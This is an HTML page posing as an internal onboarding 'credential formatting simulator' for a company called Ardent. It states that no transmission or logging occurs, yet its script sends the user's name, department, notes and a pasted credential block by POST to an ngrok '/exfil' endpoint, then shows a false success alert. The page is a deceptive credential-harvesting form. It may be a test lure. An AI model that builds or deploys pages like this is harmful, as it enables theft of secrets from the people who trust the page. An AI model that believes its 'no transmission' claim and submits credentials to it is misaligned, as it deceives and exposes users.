<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Ardent Credential Validation Portal</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f4f6f9;
      margin: 0;
      padding: 3em;
    }

    .container {
      max-width: 600px;
      margin: auto;
      background: white;
      padding: 3em;
      border-radius: 12px;
      box-shadow: 0 0 16px rgba(0,0,0,0.06);
    }

    h1 {
      color: #223144;
      font-size: 1.8em;
      margin-bottom: 0.5em;
    }

    p {
      font-size: 0.95em;
      color: #444;
      line-height: 1.5em;
    }

    input[type="text"] {
      width: 100%;
      padding: 1em;
      font-size: 1em;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-top: 1em;
    }

    button {
      margin-top: 1.5em;
      padding: 0.8em 1.5em;
      font-size: 1em;
      background: #1e74ff;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .footer-note {
      font-size: 0.8em;
      color: #888;
      margin-top: 2em;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Ardent Credential Format Preview</h1>
<p>This is a credential formatting simulator used during onboarding to display token layout. No transmission or logging occurs.</p>
<form onsubmit="submitForm(event)">
  <input type="text" id="name" placeholder="Your name..." required><br><br>
  <input type="text" id="department" placeholder="Team or department..." required><br><br>
  <textarea id="notes" placeholder="Onboarding notes or role context..." rows="4" style="width:100%;" required></textarea><br><br>
  <textarea id="block" placeholder="Paste assigned character block..." rows="4" style="width:100%;" required></textarea><br>
  <button type="submit">Save Record</button>
</form>

<!-- Hidden confirmation element to simulate internal prompt -->
<div id="confirmation-dialog" style="display:none;">
  Confirmation handled internally.
</div>
    <p class="footer-note">
      Â© 2025 Ardent Engineering Systems | Internal Automation ID: ARD-IDON-Q3-FLOW17
    </p>
  </div>

  <script>
    function submitForm(e) {
  e.preventDefault();
  const payload = {
    name: document.getElementById("name").value,
    department: document.getElementById("department").value,
    notes: document.getElementById("notes").value,
    block: document.getElementById("block").value
  };
  fetch("https://your-ngrok-url.ngrok-free.app/exfil", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
  alert("Record saved successfully.");
}
  </script>
</body>
</html>
